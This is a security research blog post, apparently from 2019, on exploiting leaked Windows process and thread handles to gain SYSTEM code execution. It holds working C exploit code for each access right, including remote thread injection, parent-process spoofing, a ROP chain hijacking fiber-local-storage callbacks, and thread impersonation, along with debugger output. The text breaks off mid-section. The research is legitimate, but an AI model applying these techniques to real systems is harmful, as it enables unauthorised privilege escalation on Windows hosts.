<!DOCTYPE html>
<html lang="en-us">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<style type=text/css>body{font-family:monospace;}</style>
	<title>Exploiting Leaked Process and Thread Handles</title>
	
	
	<link rel="stylesheet" href="/css/style.css">
	
	
</head>
<body>
	<header>

	<div style="float: right;"></div><br>
	<p>
	<nav>
			<a href="/"><b>post</b></a>.
			
			
			<a href="/other/"><b>other</b></a>.
			
			<a href="/about/"><b>about</b></a>.
			
	</nav>
	</p>
	
</header>

	
	<main>
		<article>
			<h1>Exploiting Leaked Process and Thread Handles</h1>
			<b><time>2019-08-22</time></b>
		       

			<div>
				<p>Over the years I&rsquo;ve seen and exploited the occasional leaked handle bug. These can be
particularly fun to toy with, as the handles aren&rsquo;t always granted
<code>PROCESS_ALL_ACCESS</code> or <code>THREAD_ALL_ACCESS</code>, requiring a bit more ingenuity.
This post will address the various access rights assignable to handles and what we
can do to exploit them to gain elevated code execution. I&rsquo;ve chosen to focus
specifically on process and thread handles as this seems to be the most common,
but surely other objects can be exploited in similar manner.</p>
<p>As background, while this bug can occur under various circumstances, I&rsquo;ve most
commonly seen it manifest when some privileged process opens a handle with
<code>bInheritHandle</code> set to true. Once this happens, any child process of this
privileged process inherits the handle and all access it grants. As example,
assume a SYSTEM level process does this:</p>
<pre tabindex="0"><code>HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, GetCurrentProcessId());
</code></pre><p>Since it&rsquo;s allowing the opened handle to be inherited, any child process
will gain access to it. If they execute userland code impersonating the desktop
user, as a service might often do, those userland processes will have access to
that handle.</p>
<h2 id="existing-bugs">Existing bugs</h2>
<p>There are several public bugs we can point to over the years as example and
inspiration. As per usual James Forshaw has a fun one from 2016[0] in which
he&rsquo;s able to leak a privileged thread handle out of the secondary logon
service with <code>THREAD_ALL_ACCESS</code>. This is the most &ldquo;open&rdquo; of permissions, but
he exploited it in a novel way that I was unaware of, at the time.</p>
<p>Another one from Ivan Fratric exploited[1] a leaked process handle with
<code>PROCESS_DUP_HANDLE</code>, which even Microsoft knew was bad. In his <code>Bypassing Mitigations by Attacking JIT Server in Microsoft Edge</code> whitepaper, he
identifies the JIT server process mapping memory into the content process. To
do this, the JIT process needs a handle to it. The content process calls
<code>DuplicateHandle</code> on itself with the <code>PROCESS_DUP_HANDLE</code>, which can be
exploited to obtain a full access handle.</p>
<p>A more recent example is a Dell LPE [2] in which a <code>THREAD_ALL_ACCESS</code> handle
was obtained from a privileged process. They were able to exploit this via a
dropped DLL and an APC.</p>
<h2 id="setup">Setup</h2>
<p>In this post, I wanted to examine all possible access rights to determine which
were exploitable on there own and which were not. Of those that were not, I
tried to determine what concoction of privileges were necessary to make it so.
I&rsquo;ve tried to stay &ldquo;realistic&rdquo; here in my experience, but you never know what
you&rsquo;ll find in the wild, and this post reflects that.</p>
<p>For testing, I created a simple client and server: a privileged server that
leaks a handle, and a client capable of consuming it. Here&rsquo;s the server:</p>
<pre tabindex="0"><code>#include &#34;pch.h&#34;
#include &lt;iostream&gt;
#include &lt;Windows.h&gt;

int main(int argc, char **argv)
{
    if (argc &lt;= 1) {
        printf(&#34;[-] Please give me a target PID\n&#34;);
        return -1;
    }

    HANDLE hUserToken, hUserProcess;
    HANDLE hProcess, hThread;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&amp;si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&amp;pi, sizeof(pi));

    hUserProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, atoi(argv[1]));
    if (!OpenProcessToken(hUserProcess, TOKEN_ALL_ACCESS, &amp;hUserToken)) {
        printf(&#34;[-] Failed to open user process: %d\n&#34;, GetLastError());
        CloseHandle(hUserProcess);
        return -1;
    }

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, GetCurrentProcessId());
    printf(&#34;[+] Process: %x\n&#34;, hProcess);

    CreateProcessAsUserA(hUserToken, 
        &#34;VulnServiceClient.exe&#34;, 
        NULL, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi);
    SuspendThread(hThread);
    return 0;
}
</code></pre><p>In the above, I&rsquo;m grabbing a handle to the token we want to impersonate,
opening an inheritable handle to the current process (which we&rsquo;re running as
SYSTEM), then spawning a child process. This child process is simply my client
application, which will go about attempting to exploit the handle.</p>
<p>The client is, of course, a little more involved. The only component that needs
a little discussion up front is fetching the leaked handle. This can be done
via <code>NtQuerySystemInformation</code> and does not require any special privileges:</p>
<pre tabindex="0"><code>void ProcessHandles()
{
    HMODULE hNtdll = GetModuleHandleA(&#34;ntdll.dll&#34;);
    _NtQuerySystemInformation NtQuerySystemInformation =
        (_NtQuerySystemInformation)GetProcAddress(hNtdll, &#34;NtQuerySystemInformation&#34;);
    _NtDuplicateObject NtDuplicateObject =
        (_NtDuplicateObject)GetProcAddress(hNtdll, &#34;NtDuplicateObject&#34;);
    _NtQueryObject NtQueryObject =
        (_NtQueryObject)GetProcAddress(hNtdll, &#34;NtQueryObject&#34;);
    _RtlEqualUnicodeString RtlEqualUnicodeString =
        (_RtlEqualUnicodeString)GetProcAddress(hNtdll, &#34;RtlEqualUnicodeString&#34;);
    _RtlInitUnicodeString RtlInitUnicodeString = 
        (_RtlInitUnicodeString)GetProcAddress(hNtdll, &#34;RtlInitUnicodeString&#34;);

    ULONG handleInfoSize = 0x10000;
    NTSTATUS status;
    PSYSTEM_HANDLE_INFORMATION phHandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
    DWORD dwPid = GetCurrentProcessId();


    printf(&#34;[+] Looking for process handles...\n&#34;);

    while ((status = NtQuerySystemInformation(
        SystemHandleInformation,
        phHandleInfo,
        handleInfoSize,
        NULL
    )) == STATUS_INFO_LENGTH_MISMATCH)
        phHandleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(phHandleInfo, handleInfoSize *= 2);

    if (status != STATUS_SUCCESS)
    {
        printf(&#34;NtQuerySystemInformation failed!\n&#34;);
        return;
    }

    printf(&#34;[+] Fetched %d handles\n&#34;, phHandleInfo-&gt;HandleCount);

    // iterate handles until we find the privileged process
    for (int i = 0; i &lt; phHandleInfo-&gt;HandleCount; ++i)
    {
        SYSTEM_HANDLE handle = phHandleInfo-&gt;Handles[i];
        POBJECT_TYPE_INFORMATION objectTypeInfo;
        PVOID objectNameInfo;
        UNICODE_STRING objectName;
        ULONG returnLength;

        // Check if this handle belongs to the PID the user specified
        if (handle.ProcessId != dwPid)
            continue;

        objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
        if (NtQueryObject(
            (HANDLE)handle.Handle,
            ObjectTypeInformation,
            objectTypeInfo,
            0x1000,
            NULL
        ) != STATUS_SUCCESS)
            continue;

        if (handle.GrantedAccess == 0x0012019f)
        {
            free(objectTypeInfo);
            continue;
        }

        objectNameInfo = malloc(0x1000);
        if (NtQueryObject(
            (HANDLE)handle.Handle,
            ObjectNameInformation,
            objectNameInfo,
            0x1000,
            &amp;returnLength
        ) != STATUS_SUCCESS)
        {
            objectNameInfo = realloc(objectNameInfo, returnLength);
            if (NtQueryObject(
                (HANDLE)handle.Handle,
                ObjectNameInformation,
                objectNameInfo,
                returnLength,
                NULL
            ) != STATUS_SUCCESS)
            {
                free(objectTypeInfo);
                free(objectNameInfo);
                continue;
            }
        }

        // check if we&#39;ve got a process object; there should only be one, but should we 
        // have multiple, this is where we&#39;d perform the checks
        objectName = *(PUNICODE_STRING)objectNameInfo;
        UNICODE_STRING pProcess, pThread;

        RtlInitUnicodeString(&amp;pThread, L&#34;Thread&#34;);
        RtlInitUnicodeString(&amp;pProcess, L&#34;Process&#34;);
        if (RtlEqualUnicodeString(&amp;objectTypeInfo-&gt;Name, &amp;pProcess, TRUE) &amp;&amp; TARGET == 0) {
            printf(&#34;[+] Found process handle (%x)\n&#34;, handle.Handle);
            HANDLE hProcess = (HANDLE)handle.Handle;
        }
        else if (RtlEqualUnicodeString(&amp;objectTypeInfo-&gt;Name, &amp;pThread, TRUE) &amp;&amp; TARGET == 1) {
            printf(&#34;[+] Found thread handle (%x)\n&#34;, handle.Handle);
            HANDLE hThread = (HANDLE)handle.Handle;
        else
            continue;
        
        free(objectTypeInfo);
        free(objectNameInfo);
    }
} 
</code></pre><p>We&rsquo;re essentially just fetching all system handles, filtering down to ones
belonging to our process, then hunting for a thread or a process. In a more
active client process with many threads or process handles we&rsquo;d need to filter
down further, but this is sufficient for testing.</p>
<p>The remainder of this post will be broken down into process and thread security
access rights.</p>
<h2 id="process">Process</h2>
<p>There are approximately 14 process-specific rights[3]. We&rsquo;re going to ignore
the standard object access rights for now (DELETE, READ_CONTROL, etc.) as they
apply more to the handle itself than what it allows one to do.</p>
<p>Right off the bat, we&rsquo;re going to dismiss the following:</p>
<pre tabindex="0"><code>PROCESS_QUERY_INFORMATION
PROCESS_QUERY_LIMITED_INFORMATION
PROCESS_SUSPEND_RESUME
PROCESS_TERMINATE
PROCESS_SET_QUOTA
PROCESS_VM_OPERATION
PROCESS_VM_READ
SYNCHRONIZE
</code></pre><p>To be clear I&rsquo;m only suggesting that the above access rights cannot be
exploited on their own; they are, of course, very useful when roped in with
others. There may be weird edge cases in which one of these might be useful
(PROCESS_TERMINATE, for example), but barring any magic, I don&rsquo;t see how.</p>
<p>That leaves the following:</p>
<pre tabindex="0"><code>PROCESS_ALL_ACCESS
PROCESS_CREATE_PROCESS
PROCESS_CREATE_THREAD
PROCESS_DUP_HANDLE
PROCESS_SET_INFORMATION
PROCESS_VM_WRITE
</code></pre><p>We&rsquo;ll run through each of these individually.</p>
<h3 id="process_all_access">PROCESS_ALL_ACCESS</h3>
<p>The most obvious of them all, this one grants us access to it all. We can
simply allocate memory and create a thread to obtain code execution:</p>
<pre tabindex="0"><code>char payload[] = &#34;\xcc\xcc&#34;;
LPVOID lpBuf = VirtualAllocEx(hProcess, NULL, 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, lpBuf, payload, 2, NULL);
CreateRemoteThread(hProcess, NULL, 0, lpBuf, 0, 0, NULL);
</code></pre><p>Nothing to it.</p>
<h3 id="process_create_process">PROCESS_CREATE_PROCESS</h3>
<p>This right is &ldquo;required to create a process&rdquo;, which is to say that we can spawn
child processes. To do this remotely, we just need to spawn a process and set
its parent to the privileged process we&rsquo;ve got a handle to. This will create
the new process and inherit its parent token which will hopefully be a SYSTEM
token.</p>
<p>Here&rsquo;s how we do that:</p>
<pre tabindex="0"><code>    STARTUPINFOEXA sinfo = { sizeof(sinfo) };
    PROCESS_INFORMATION pinfo;
    LPPROC_THREAD_ATTRIBUTE_LIST ptList = NULL;
    SIZE_T bytes;
    
    sinfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    InitializeProcThreadAttributeList(NULL, 1, 0, &amp;bytes);
    ptList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(bytes);
    InitializeProcThreadAttributeList(ptList, 1, 0, &amp;bytes);

    UpdateProcThreadAttribute(ptList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;hPrivProc, sizeof(HANDLE), NULL, NULL);
    sinfo.lpAttributeList = ptList;

    CreateProcessA(&#34;cmd.exe&#34;, (LPSTR)&#34;cmd.exe /c calc.exe&#34;, 
            NULL, NULL, TRUE, 
            EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, 
            &amp;sinfo.StartupInfo, &amp;pinfo);
</code></pre><p>We should now have calc running with the privileged token. Obviously we&rsquo;d want
to replace that with something more useful!</p>
<h3 id="process_create_thread">PROCESS_CREATE_THREAD</h3>
<p>Here we&rsquo;ve got the ability to use <code>CreateRemoteThread</code>, but can&rsquo;t control any
memory in the target process. There are of course ways we can influence memory
without direct write access, such as WNF, but we&rsquo;d still have no way of
resolving those addresses. As it turns out, however, we don&rsquo;t need the control.
<code>CreateRemoteThread</code> can be pointed at a function with a single argument, which
gives us quite a bit of control. <code>LoadLibraryA</code> and <code>WinExec</code> are both great
candidates for executing child processes or loading arbitrary code.</p>
<p>As example, there&rsquo;s an ANSI <code>cmd.exe</code> located in msvcrt.dll at offset 0x503b8.
We can pass this as an argument to <code>CreateRemoteThread</code> and trigger a <code>WinExec</code>
call to pop a shell:</p>
<pre tabindex="0"><code>DWORD dwCmd = (GetModuleBaseAddress(GetCurrentProcessId(), L&#34;msvcrt.dll&#34;) + 0x503b8);
HANDLE hThread = CreateRemoteThread(hPrivProc, NULL, 0,
                        (LPTHREAD_START_ROUTINE)WinExec, 
                        (LPVOID)dwCmd, 
                        0, NULL);
</code></pre><p>We can do something similar for <code>LoadLibraryA</code>. This of course is predicated on
the system path containing a writable directory for our user.</p>
<h3 id="process_dup_handle">PROCESS_DUP_HANDLE</h3>
<p>Microsoft&rsquo;s own documentation on process security and access rights points to
this specifically as a sensitive right. Using it, we can simply duplicate our
process handle with <code>PROCESS_ALL_ACCESS</code>, allowing us full RW to its address
space. As per Ivan Fratric&rsquo;s JIT bug, it&rsquo;s as simple as this:</p>
<pre tabindex="0"><code>HANDLE hDup = INVALID_HANDLE_VALUE;
DuplicateHandle(hPrivProc, GetCurrentProcess(), GetCurrentProcess(), &amp;hDup, PROCESS_ALL_ACCESS, 0, 0)
</code></pre><p>Now we can simply follow the WriteProcessMemory/CreateRemoteThread strategy for
executing arbitrary code.</p>
<h3 id="process_set_information">PROCESS_SET_INFORMATION</h3>
<p>Granting this permission allows one to execute <code>SetInformationProcess</code> in
addition to several fields in <code>NtSetInformationProcess</code>. The latter is far more
powerful, but many of the <code>PROCESSINFOCLASS</code> fields available are either read
only or require additional privileges to actually set (<code>SeDebugPrivilege</code> for
<code>ProcessExceptionPort</code> and <code>ProcessInstrumentationCallback</code>(win7) for
example). Process Hacker[15] maintains an up to date definition of this class
and its members.</p>
<p>Of the available flags, none were particularly interesting on their own. I
needed to add <code>PROCESS_VM_*</code> privileges in order to make any usable and at
that point we defeat the purpose.</p>
<h3 id="process_vm_">PROCESS_VM_*</h3>
<p>This covers the three flavors of VM access: WRITE/READ/OPERATION. The first two
should be self-explanatory and the third allows one to operate on the virtual
address space itself, such as changing page protections (VirtualProtectEx) or
allocating memory (VirtualAllocEx). I won&rsquo;t address each permutation of these
three, but I think it&rsquo;s reasonable to assume that <code>PROCESS_VM_WRITE</code> is a
necessary requirement. While <code>PROCESS_VM_OPERATION</code> allows us to crash the
remote process which could open up other flaws, it&rsquo;s not a generic nor elegant
approach. Ditto with <code>PROCESS_VM_READ</code>.</p>
<p><code>PROCESS_VM_WRITE</code> proved to be a challenge on its own, and I was unable to
come up with a generic solution. At first blush, the entire set of
Shatter-like injection strategies documented by Hexacorn[12] seem like
they&rsquo;d be perfect. They simply require the remote process to use windows,
clipboard registrations, etc. None of these are guaranteed, but chances are one
is bound to exist. Unfortunately for us, many of them restrict access across
sessions or scaling integrity levels. We can write into the remote process,
but we need some way to gain control over execution flow.</p>
<p>In addition to being unable to modify page permissions, we cannot read nor
map/allocate memory. There are plenty of ways we can leak memory from the
remote process without directly interfacing with it, however.</p>
<p>Using <code>NtQuerySystemInformation</code>, for example, we can enumerate all threads
inside a remote process regardless of its IL. This grants us a list of
<code>SYSTEM_EXTENDED_THREAD_INFORMATION</code> objects which contain, among other
things, the address of the TEB. <code>NtQueryInformationProcess</code> allows us to fetch
the remote process PEB address. This latter API requires the
<code>PROCESS_QUERY_INFORMATION</code> right, however, which ended up throwing a major
wrench in my plan. Because of this I&rsquo;m appending <code>PROCESS_QUERY_INFORMATION</code>
onto <code>PROCESS_VM_WRITE</code> which gives us the necessary components to pull this
off. If someone knows of a way to leak the address of a remote process PEB
without it, I&rsquo;d love to hear.</p>
<p>The approach I took was a bit loopy, but it ended up working reliably and
generically. If you&rsquo;ve read my previous post on fiber local storage (FLS)[13],
this is the research I was referring to. If you haven&rsquo;t, I recommend giving it
a brief read, but I&rsquo;ll regurgitate a bit of it here.</p>
<p>Briefly, we can abuse fibers and FLS to overwrite callbacks which are executed
&ldquo;&hellip;on fiber deletion, thread exit, and when an FLS index is freed&rdquo;. The
primary thread of a process will always setup a fiber, thus there will always
be a callback for us to overwrite (msvcrt!_freefls). Callbacks are stored in
the PEB (FlsCallback) and the fiber local storage in the TEB (FlsData). By
smashing the FlsCallback we can obtain control over execution flow when one of
the fiber actions are taken.</p>
<p>With only write access to the process, however, this becomes a bit convoluted.
We cannot allocate memory and so we need some known location to put the
payload. In addition, the FlsCallback and FlsData variables in PEB/TEB are
pointers and we&rsquo;re unable to read these.</p>
<p>Stashing the payload turned out to be pretty simple. Since we&rsquo;ve established
we can leak PEB/TEB addresses we already have two powerful primitives. After
looking over both structures, I found that thread local storage (TLS) happened
to provide us with enough room to store ROP gadgets and a thin payload. TLS is
embedded within the structure itself, so we can simply offset into the TEB
address (which we have). If you&rsquo;re unfamiliar with TLS, Skywing&rsquo;s write-ups are
fantastic and have aged well[14].</p>
<p>Gaining control over the callback was a little trickier. A pointer to a
<code>_FLS_CALLBACK_INFO</code> structure is stored in the PEB (FlsCallback) and is an
opaque structure. Since we can&rsquo;t actually read this pointer, we have no simple
way of overwriting the pointer. Or do we?</p>
<p>What I ended up doing is overwriting the FlsCallback pointer itself in the PEB,
essentially creating my own fake <code>_FLS_CALLBACK_INFO</code> structure in TLS. It&rsquo;s a
pretty simple structure and really only has one value of importance: the
callback pointer.</p>
<p>In addition, as per the FLS article, we also need to take control over ECX/RCX.
This will allow us to stack pivot and continue executing our ROP payload. This
requires that we update the <code>TEB-&gt;FlsData</code> entry which we also are unable to
do, since it&rsquo;s a pointer. Much like <code>FlsCallback</code>, though, I was able to just
overwrite this value and craft my own data structure, which also turned out to
be pretty simple. The TLS buffer ended up looking like this:</p>
<pre tabindex="0"><code>    //
    // 0  ] 00000000 00000000 [STACK PIVOT] 00000000
    // 16 ] 00000000 00000000 [ECX VALUE] [NEW STACK PTR]
    // 32 ] 41414141 41414141 41414141 41414141 
    //
</code></pre><p>There just so happens to be a perfect stack pivot gadget located in
<code>kernelbase!SwitchToFiberContext</code> (or <code>kernel32!SwitchToFiber</code> on Windows 7):</p>
<pre tabindex="0"><code>7603c415 8ba1d8000000    mov     esp,dword ptr [ecx+0D8h]
7603c41b c20400          ret     4
</code></pre><p>Putting this all together, execution results in:</p>
<pre tabindex="0"><code>eax=7603c415 ebx=7ffdf000 ecx=7ffded54 edx=00280bc9 esi=00000001 edi=7ffdee28
eip=7603c415 esp=0019fd6c ebp=0019fd84 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
kernel32!SwitchToFiber+0x115:
7603c415 8ba1d8000000    mov     esp,dword ptr [ecx+0D8h]
ds:0023:7ffdee2c=7ffdee30
0:000&gt; p
eax=7603c415 ebx=7ffdf000 ecx=7ffded54 edx=00280bc9 esi=00000001 edi=7ffdee28
eip=7603c41b esp=7ffdee30 ebp=0019fd84 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
kernel32!SwitchToFiber+0x11b:
7603c41b c20400          ret     4
0:000&gt; dd esp l3
7ffdee30  41414141 41414141 41414141
</code></pre><p>Now we&rsquo;ve got EIP and a stack pivot. Instead of marking memory and executing
some other payload, I took a quick and lazy strategy and simply called
<code>LoadLibraryA</code> to load a DLL off disk from an arbitrary location. This works
well, is reliable, and even on process exit will execute and block, depending
on what you do within the DLL. Here&rsquo;s the final code to achieve all this:</p>
<pre tabindex="0"><code>    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA(&#34;ntdll&#34;), &#34;NtWriteVirtualMemory&#34;);

    LPVOID lpBuf = malloc(13*sizeof(SIZE_T));
    HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION, FALSE, dwTargetPid);
    if (hProcess == NULL)
        return;

    SIZE_T LoadLibA = (SIZE_T)LoadLibraryA;
    SIZE_T RemoteTeb = GetRemoteTeb(hProcess), TlsAddr = 0;
    TlsAddr = RemoteTeb + 0xe10;

    SIZE_T RemotePeb = GetRemotePeb(hProcess);
    SIZE_T PivotGadget = 0x7603c415;
    SIZE_T StackAddress = (TlsAddr + 28) - 0xd8;
    SIZE_T RtlExitThread = (SIZE_T)GetProcAddress(GetModuleHandleA(&#34;ntdll&#34;), &#34;RtlExitUserThread&#34;);
    SIZE_T LoadLibParam = (SIZE_T)TlsAddr + 48;

    //
    // construct our TlsSlots payload:
    // 0  ] 00000000 00000000 [STACK PIVOT] 00000000
    // 16 ] 00000000 00000000 [ECX VALUE] [NEW STACK PTR]
    // 32 ] [LOADLIB ADDR] 41414141 [RET ADDR] [LOADLIB ARG PTR]
    // 48 ] 41414141
    //

    memset(lpBuf, 0x0, 16);
    *((DWORD*)lpBuf + 2) = PivotGadget;
    *((DWORD*)lpBuf+ 4) = 0;
    *((DWORD*)lpBuf + 5) = 0;
    *((DWORD*)lpBuf + 6) = StackAddress;
    
    StackAddress = TlsAddr + 32;
    *((DWORD*)lpBuf + 7) = StackAddress;
    *((DWORD*)lpBuf + 8) = LoadLibA;
    *((DWORD*)lpBuf + 9) = 0x41414141; // junk
    *((DWORD*)lpBuf + 10) = RtlExitThread;
    *((DWORD*)lpBuf + 11) = (SIZE_T)TlsAddr + 48;
    *((DWORD*)lpBuf + 12) = 0x41414141; // DLL name (AAAA.dll)

    NtWriteVirtualMemory(hProcess, (PVOID)TlsAddr, lpBuf, (13 * sizeof(SIZE_T)), NULL);

    // update FlsCallback in PEB and FlsData in TEB
    StackAddress = TlsAddr + 12;
    NtWriteVirtualMemory(hProcess, (LPVOID)(RemoteTeb + 0xfb4), (PVOID)&amp;StackAddress, sizeof(SIZE_T), NULL);
    NtWriteVirtualMemory(hProcess, (LPVOID)(RemotePeb + 0x20c), (PVOID)&amp;TlsAddr, sizeof(SIZE_T), NULL);
</code></pre><p>If all works well you should see attempts to load <code>AAAA.dll</code> off disk when the
callback is executed (just close the process). As a note, we&rsquo;re using
<code>NtWriteVirtualMemory</code> here because <code>WriteProcessMemory</code> requires
<code>PROCESS_VM_OPERATION</code> which we may not have.</p>
<p>Another variation of this access might be <code>PROCESS_VM_WRITE|PROCESS_VM_READ</code>.
This gives us visibility into the address space, but we still cannot allocate
or map memory into the remote process. Using the above strategy we can rid
ourselves of the <code>PROCESS_QUERY_INFORMATION</code> requirement and simply read the
PEB address out of TEB.</p>
<p>Finally, consider <code>PROCESS_VM_WRITE|PROCESS_VM_READ|PROCESS_VM_OPERATION</code>.
Granting us <code>PROCESS_VM_OPERATION</code> loosens the restrictions quite a bit, as we
can now allocate memory and change page permissions. This allows us to more
easily use the above strategy, but also perform inline and IAT hooks.</p>
<h2 id="thread">Thread</h2>
<p>As with the process handles, there are a handful of access rights we can dismiss
immediately:</p>
<pre tabindex="0"><code>SYNCHRONIZE
THREAD_QUERY_INFORMATION
THREAD_GET_CONTEXT
THREAD_QUERY_LIMITED_INFORMATION
THREAD_SUSPEND_RESUME
THREAD_TERMINATE
</code></pre><p>Which leaves the following:</p>
<pre tabindex="0"><code>THREAD_ALL_ACCESS
THREAD_DIRECT_IMPERSONATION
THREAD_IMPERSONATE
THREAD_SET_CONTEXT
THREAD_SET_INFORMATION
THREAD_SET_LIMITED_INFORMATION
THREAD_SET_THREAD_TOKEN
</code></pre><h3 id="thread_all_access">THREAD_ALL_ACCESS</h3>
<p>There&rsquo;s quite a lot we can do with this, including everything described in the
following thread access rights sections. I personally find the
<code>THREAD_DIRECT_IMPERSONATION</code> strategy to be the easiest.</p>
<p>There is another option that is a bit more arcane, but equally viable. Note
that this thread access doesn&rsquo;t give us VM read/write privileges, so there&rsquo;s
no easy to way to &ldquo;write&rdquo; into a thread, since that doesn&rsquo;t really make sense.
What we do have, however, is a series of APIs that sort of grant us that:
<code>SetThreadContext</code>[4] and <code>GetThreadContext</code>[5]. About a decade ago a code
injection technique dubbed Ghostwriting[6] was released to little fanfare. In
it, the author describes a code injection strategy that does not require the
typical win32 API calls; there&rsquo;s no WriteProcessMemory, NtMapViewOfSection, or
even OpenProcess.</p>
<p>While the write-up is lacking in a few departments, it&rsquo;s quite a clever bit of
code. In short, the author abuses the <code>SetThreadContext</code>/<code>GetThreadContext</code>
calls in tandem with a set of specific assembly gadgets to write a payload,
dword by dword, onto the threads stack. Once written, they use
<code>NtProtectVirtualMemoryAddress</code> to mark the code RWX and redirect code flow to
their payload.</p>
<p>For their write gadget, they hunt for a pattern inside NTDLL:</p>
<pre tabindex="0"><code>MOV [REG1], REG2
RET
</code></pre><p>They then locate a <code>JMP $</code>, or jump here, which will operate as an auto lock
and infinitely loop. Once we&rsquo;ve found our two gadgets, we suspend the thread.
We update its RIP to point to the MOV gadget, set our REG1 to an adjusted RSP
so the return address is the <code>JMP $</code>, and set REG2 to the jump gadget. Here&rsquo;s
my write function:</p>
<pre tabindex="0"><code>void WriteQword(CONTEXT context, HANDLE hThread, size_t WriteWhat, size_t WriteWhere)
{
    SetContextRegister(&amp;context, g_rside, WriteWhat);
    SetContextRegister(&amp;context, g_lside, WriteWhere);

    context.Rsp = StackBase;
    context.Rip = MovAddr;

    WaitForThreadAutoLock(hThread, &amp;context, JmpAddr);
}
</code></pre><p>The <code>SetContextRegister</code> call simply assigns REG1 and REG2 in our gadget to the
appropriate registers. Once those are set, we set our stack base (adjusted from
threads RSP) and update RIP to our gadget. The first time we execute this we&rsquo;ll
write our <code>JMP $</code> gadget to the stack.</p>
<p>They use what they call a thread auto lock to control execution flow (edits
mine):</p>
<pre tabindex="0"><code>void WaitForThreadAutoLock(HANDLE Thread, CONTEXT* PThreadContext,HWND ThreadsWindow,DWORD AutoLockTargetEIP)
{
    SetThreadContext(Thread,PThreadContext);

    do
    {
        ResumeThread(Thread);
        Sleep(30); 
        SuspendThread(Thread);
        GetThreadContext(Thread,PThreadContext);
    }
    while(PThreadContext-&gt;Eip!=AutoLockTargetEIP);
}
</code></pre><p>It&rsquo;s really just a dumb waiter that allows the thread to execute a little bit
each run before checking if the &ldquo;sink&rdquo; gadget has been reached.</p>
<p>Once our execution hits the jump, we have our write primitive. We can now
simply adjust RIP back to the MOV gadget, update RSP, and set REG1 and REG2 to
any values we want.</p>
<p>I ported the core function of this technique to x64 to demonstrate its
viability. Instead of using it to execute an entire payload, I simply execute
<code>LoadLibraryA</code> to load in an arbitrary DLL at an arbitrary path. The code is
available on Github[11]. Turning it into something production ready is left as
an exercise for the reader ;)</p>
<p>Additionally, while attending Blackhat 2019, I saw a process injection talk by
the SafeBreach Labs group. They&rsquo;ve release a code injection tool that contains
an x64 implementation of GhostWriting[10]. While I haven&rsquo;t personally evaluated
it, it&rsquo;s probably more production ready and usable than mine.</p>
<h3 id="thread_direct_impersonation">THREAD_DIRECT_IMPERSONATION</h3>
<p>This differs from <code>THREAD_IMPERSONATE</code> in that it allows the thread token to be
impersonated, not simply TO impersonate. Exploiting this is simply a matter of
using the <code>NtImpersonateThread</code>[8] API, as pointed out by James Forshaw[0][7].
Using this we&rsquo;re able to create a thread totally under our control and
impersonate the privileged one:</p>
<pre tabindex="0"><code>hNewThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpRtl, 0, CREATE_SUSPENDED, &amp;dwTid);
NtImpersonateThread(hNewThread, hThread, &amp;sqos);
</code></pre><p>The <code>hNewThread</code> will now be executing with a SYSTEM token, allowing us to do
whatever we need under the privileged impersonation context.</p>
<h3 id="thread_impersonate">THREAD_IMPERSONATE</h3>
<p>Unfortunately I was unable to identify a surefire, generic method for
exploiting this one. We have no ability to query the remote thread, nor can we
gain any control over its execution flow. We&rsquo;re simply allowed to manage its
impersonation state.</p>
<p>We can use this to force the privileged thread to impersonate us, using the
<code>NtImpersonateThread</code> call, which may unlock additional logic bugs in the
application. For example, if the service were to create shared resources under
a user context for which it would typically be SYSTEM, such as a file, we can
gain ownership over that file. If multiple privileged threads access it for
information (such as configuration) it could lead to code execution.</p>
<h3 id="thread_set_context">THREAD_SET_CONTEXT</h3>
<p>While this right grants us access to <code>SetThreadContext</code>, it also conveniently
allows us to use <code>QueueUserAPC</code>. This is effectively granting us a
<code>CreateRemoteThread</code> primitive with caveat. For an APC to be processed by the
thread, it needs to enter an alertable state. This happens when a specific set
of win32 functions are executed, so it is entirely possible that the thread
never becomes alertable.</p>
<p>If we&rsquo;re working with an uncooperative thread, <code>SetThreadContext</code> comes in
handy. Using it, we can force the thread to become alertable via the
<code>NtTestAlert</code> function. Of course, we have no ability to call
<code>GetThreadContext</code> and will therefore likely lose control of the thread after
exploitation.</p>
<p>In combination with <code>THREAD_GET_CONTEXT</code>, this right would allow us to
replicate the Ghostwriting code injection technique discussed in the
<code>THREAD_ALL_ACCESS</code> section above.</p>
<h3 id="thread_set_information">THREAD_SET_INFORMATION</h3>
<p>Needed to set various ThreadInformationClass[9] values on a thread, usually via
<code>NtSetInformationThread</code>. After looking through all of these, I did not
identify any immediate ways in which we could influence the remote thread. Some
of the values are interesting but unusuable (<code>ThreadSetTlsArrayAddress</code>,
<code>ThreadAttachContainer</code>, etc) and are either not implemented/removed or
require <code>SeDebugPrivilege</code> or similar.</p>
<p>I&rsquo;m not really sure what would make this a viable candidate either. There&rsquo;s
really not a lot of juicy stuff that can be done via the available functions</p>
<h3 id="thread_set_limited_information">THREAD_SET_LIMITED_INFORMATION</h3>
<p>This allows the caller to set a subset of <code>THREAD_INFORMATION_CLASS</code> values,
namely: <code>ThreadPriority</code>, <code>ThreadPriorityBoost</code>, <code>ThreadAffinityMask</code>,
